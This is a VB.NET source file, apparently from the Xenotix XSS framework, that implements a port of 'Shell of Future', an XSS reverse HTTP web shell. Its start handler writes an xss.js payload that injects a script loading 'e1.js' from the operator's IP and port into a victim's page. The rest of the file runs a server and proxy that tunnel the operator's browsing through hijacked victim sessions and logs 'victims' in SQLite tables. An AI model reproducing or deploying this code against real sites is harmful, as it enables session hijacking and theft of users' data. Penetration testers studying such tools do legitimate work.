'Thanks to Lavakumar Kuppan and Ajesh K Ajayan
'The original source code is taken from Lavakumar Kuppan's Shell of Future
'VB.NET port of Shell of Future made possible by Ajesh K Ajayan

Imports System.Data.SQLite
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports Xenotix.sotf
Imports System.Data


Public Class xss_reversehttpwebshell
    Dim chkport As Integer
    Public server_port As Integer
    Public proxy_port As Integer
    Public server_url As String
    Public server_loopback As Boolean = False
    Public proxy_loopback As Boolean = False
    Public server_ip As IPAddress
    Public proxy As proxy
    Public server As server
    Public qHandler As qHandler
    Public victimcounter As New vidCount()
    Public requestcounter As New ridCount()
    Public to_serverQ As New Queue(Of request)()
    Public to_browserQ As New Queue(Of response)()
    Public dead_responseQ As New Queue(Of Integer)()
    Public requestList As New Dictionary(Of Integer, request)()
    Public responseList As New Dictionary(Of Integer, response)()
    Public qh_running As Boolean = False
    Public run As Boolean = False
    Public direct_fetch As Boolean = True
    Public images_df As Boolean = True
    Public swf_df As Boolean = True
    Public css_df As Boolean = True
    Public js_df As Boolean = True
    Public html_df As Boolean = True
    Public ppt_df As Boolean = True
    Public doc_df As Boolean = True
    Public pdf_df As Boolean = True
    Public non_dynamic_df As Boolean
    Public is_regex_df As Boolean
    Public regex_df As String = ""
    Public is_upproxy_df As Boolean
    Public upproxyurl_df As String = ""
    Public is_ssl_rr As Boolean = True

    Public response_rewrite As Boolean = True
    Public is_regex_rr As Boolean
    Public match_rr As String = "<body"
    Public replace_rr As String = ""

    Public Sub New()
        InitializeComponent()

    End Sub

    Private Sub ShellForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        server_ip_tb.Text = xss_server.xip
        chkport = Integer.Parse(xss_server.xport)
        server_port_tb.Text = chkport + 1
    End Sub

    Private Sub ShellForm_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

    End Sub

    Private Sub start_btn_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles start_btn.Click
        On Error Resume Next
        Dim tmp As Integer = Integer.Parse(server_port_tb.Text)
        If tmp > 65354 Or tmp < 1 Or chkport = tmp And start_btn.Text = "Start" Then
            MsgBox("This Port Number cannot be used.", vbCritical)
        ElseIf tmp = 3555 Then
            MsgBox("Reserved Port", vbCritical)
        Else
            If start_btn.Text.Equals("Start") Then

                start_btn.Enabled = False
                If tryStart() Then
                    start_btn.Text = "Stop"
                    Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
                    stream.WriteLine("function load_shell(){if (document.getElementById('revshell') == null){ ")
                    stream.WriteLine("script = document.createElement('script');script.id = 'revshell';script.src ='http://" & xss_server.xip & ":" & server_port_tb.Text & "/e1.js';")
                    stream.Write("document.body.appendChild(script);}} load_shell();")
                    stream.Close()
                    MsgBox("Configure your Browser Proxy to 127.0.0.1:" & proxy_port_tb.Text & " and visit http://127.0.0.1/console", vbInformation)
                End If
                start_btn.Enabled = True
            Else
                start_btn.Enabled = False
                run = False
                Me.server.[stop]()
                Me.proxy.[stop]()
                start_btn.Text = "Start"
                start_btn.Enabled = True
            End If
        End If
    End Sub

    Private Sub mode_server_rb_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        server_ip_tb.Enabled = False
        server_ip_tb.Visible = False

    End Sub

    Private Sub mode_proxy_rb_CheckedChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

        server_ip_tb.Enabled = True
        server_ip_tb.Visible = True
    End Sub

    Private Function validateInput() As Boolean
        If Not (Int32.TryParse(server_port_tb.Text, server_port) AndAlso Int32.TryParse(proxy_port_tb.Text, proxy_port)) Then
            MessageBox.Show("Invalid server or proxy port number")
            Return False
        ElseIf server_port > 65535 OrElse server_port < 0 OrElse proxy_port > 65535 OrElse proxy_port < 0 Then
            MessageBox.Show("Invalid server or proxy port number")
            Return False
        End If
        If is_upproxy_df Then
            If Not Uri.IsWellFormedUriString(upproxyurl_df, UriKind.Absolute) Then
                MessageBox.Show("Invalid proxy URL")
                Return False
            End If
        End If

        proxy_loopback = True


        Return True
    End Function
    Private Sub initialise_logDB()
        Dim log As New SQLiteConnection("data source=log.s3db")
        log.Open()
        Using create As SQLiteTransaction = log.BeginTransaction()
            Using cmd As New SQLiteCommand(log)
                cmd.CommandText = "DROP TABLE IF EXISTS log"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "CREATE TABLE IF NOT EXISTS log (vid TEXT, rid TEXT, method TEXT, url TEXT, post_body TEXT, status TEXT, headers TEXT, response_body TEXT)"
                cmd.ExecuteNonQuery()
            End Using
            create.Commit()
        End Using
        log.Close()
    End Sub

    Private Sub initialise_ServerDB()

        Dim db As New SQLite.SQLiteConnection("data source=db.s3db")
        db.Open()
        Using create As SQLite.SQLiteTransaction = db.BeginTransaction()
            Using cmd As New SQLite.SQLiteCommand(db)
                cmd.CommandText = "DROP TABLE IF EXISTS from_proxy"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "DROP TABLE IF EXISTS from_victim"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "DROP TABLE IF EXISTS victims"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "DROP TABLE IF EXISTS exceptions"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "CREATE TABLE IF NOT EXISTS from_proxy (vid TEXT, rid TEXT UNIQUE, data TEXT)"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "CREATE TABLE IF NOT EXISTS from_victim (vid TEXT, rid TEXT UNIQUE, data TEXT)"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "CREATE TABLE IF NOT EXISTS victims (vid TEXT UNIQUE, ip TEXT, origin TEXT)"
                cmd.ExecuteNonQuery()
                cmd.CommandText = "CREATE TABLE IF NOT EXISTS exceptions (eid TEXT, msg TEXT, trace TEXT)"
                cmd.ExecuteNonQuery()
            End Using
            create.Commit()
        End Using
        db.Close()
    End Sub
    Private Sub initialise_config()

        If is_upproxy_df Then

            Me.upproxyurl_df = upproxyurl_df_in.Text
        End If
        If is_regex_df Then
            Me.regex_df = regex_df_in.Text
        End If
    End Sub
    Private Function tryStart() As Boolean
        run = True
        Try
            Me.initialise_ServerDB()
            Me.initialise_logDB()
        Catch ex As Exception
            MsgBox(ex.Message.ToString, vbCritical)
            Application.[Exit]()
        End Try
        Me.initialise_config()
        If Not validateInput() Then
            Return False
        End If
        server_url = "http://127.0.0.1:" & server_port
        server = New server(Me)
        Dim st As New Thread(New ThreadStart(AddressOf server.start))
        st.Start()

        proxy = New proxy(Me)
        Dim t As New Thread(New ThreadStart(AddressOf proxy.start))
        t.Start()
        qHandler = New qHandler(Me)
        Dim qt As New Thread(New ThreadStart(AddressOf qHandler.run))
        qt.Start()
        Return True
    End Function



    Private Sub helpLink_LinkClicked_1(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles helpLink.LinkClicked
        MsgBox("This module is ported from Lavakumar Kuppan’s Shell of Future. The VB.NET Translation is done by Ajesh K Ajayan", vbInformation, "Credits")
    End Sub


    Private Sub upproxy_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles upproxy_df_cb.CheckedChanged
        is_upproxy_df = upproxy_df_cb.Checked
        If is_upproxy_df Then
            upproxyurl_df_in.Enabled = True
        Else
            upproxyurl_df_in.Enabled = False
        End If
    End Sub

    Private Sub regex_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles regex_df_cb.CheckedChanged
        is_regex_df = regex_df_cb.Checked
        If is_regex_df Then
            regex_df_in.Enabled = True
        Else
            regex_df_in.Enabled = False
        End If
    End Sub

    Private Sub non_dynamic_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles non_dynamic_df_cb.CheckedChanged
        non_dynamic_df = non_dynamic_df_cb.Checked
    End Sub

    Private Sub images_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles images_df_cb.CheckedChanged
        images_df = images_df_cb.Checked
    End Sub

    Private Sub swf_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles swf_df_cb.CheckedChanged
        swf_df = swf_df_cb.Checked
    End Sub

    Private Sub js_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles js_df_cb.CheckedChanged
        js_df = js_df_cb.Checked
    End Sub

    Private Sub pdf_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles pdf_df_cb.CheckedChanged
        pdf_df = pdf_df_cb.Checked
    End Sub

    Private Sub html_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles html_df_cb.CheckedChanged
        html_df = html_df_cb.Checked
    End Sub

    Private Sub ppt_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ppt_df_cb.CheckedChanged
        ppt_df = ppt_df_cb.Checked
    End Sub

    Private Sub doc_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles doc_df_cb.CheckedChanged
        doc_df = doc_df_cb.Checked
    End Sub

    Private Sub css_df_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles css_df_cb.CheckedChanged
        css_df = css_df_cb.Checked
    End Sub

    Private Sub direct_fetch_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles direct_fetch_cb.CheckedChanged
        direct_fetch = direct_fetch_cb.Checked
    End Sub

    Private Sub ssl_rr_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ssl_rr_cb.CheckedChanged

    End Sub

    Private Sub proxy_lb_cb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        run = False
        Me.server.[stop]()
        Me.proxy.[stop]()
        Me.Dispose()
        Me.Close()
    End Sub

    Private Sub GroupBox3_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GroupBox3.Enter

    End Sub

    Private Sub GroupBox1_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GroupBox1.Enter

    End Sub
End Class
